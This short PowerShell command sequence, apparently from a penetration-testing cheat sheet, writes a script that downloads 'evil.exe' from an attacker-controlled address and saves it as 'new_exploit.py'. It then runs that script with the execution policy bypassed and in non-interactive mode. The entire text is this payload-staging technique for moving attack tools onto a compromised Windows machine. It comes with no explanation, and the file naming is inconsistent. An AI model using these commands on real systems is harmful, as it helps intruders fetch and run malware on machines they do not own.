PS  echo '$storageDir = $pwd' > wget.ps1
PS  echo '$webclient = New-Object System.Net.WebClient' >> wget.ps1
PS  echo '$url = "http://192.168.x.x/evil.exe"' >> wget.ps1
PS  echo '$file = "new_exploit.py"' >> wget.ps1
PS  echo '$webclient.DownloadFile($url, $file)' >> wget.ps1

PS  powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1




